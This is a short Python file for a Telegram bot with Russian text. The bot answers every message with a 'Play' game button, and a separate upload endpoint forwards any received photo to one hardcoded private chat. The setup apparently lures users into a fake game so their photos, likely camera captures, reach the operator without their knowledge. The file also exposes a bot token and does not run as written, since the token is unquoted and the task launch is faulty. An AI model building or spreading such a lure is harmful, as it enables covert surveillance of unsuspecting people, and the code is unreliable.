import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from fastapi import FastAPI, UploadFile, File
import uvicorn

TOKEN = 8660399029:AAGH4jobrRRFlEj1aZuflMF0fMz232sQp9g
MY_CHAT_ID = 8528619678
WEBAPP_URL = "https://ЗАМЕНИШЬ_ПОЗЖЕ/webapp/index.html"

bot = Bot(TOKEN)
dp = Dispatcher()
app = FastAPI()

@dp.message()
async def start(msg: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🎮 Играть", web_app=WebAppInfo(url=WEBAPP_URL))
    ]])
    await msg.answer("Нажми кнопку, чтобы играть:", reply_markup=kb)

@app.post("/upload")
async def upload(photo: UploadFile = File(...)):
    data = await photo.read()
    await bot.send_photo(MY_CHAT_ID, BufferedInputFile(data, filename="photo.jpg"))
    return {"ok": True}

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.create_task(main())
    uvicorn.run(app, host="0.0.0.0", port=8000)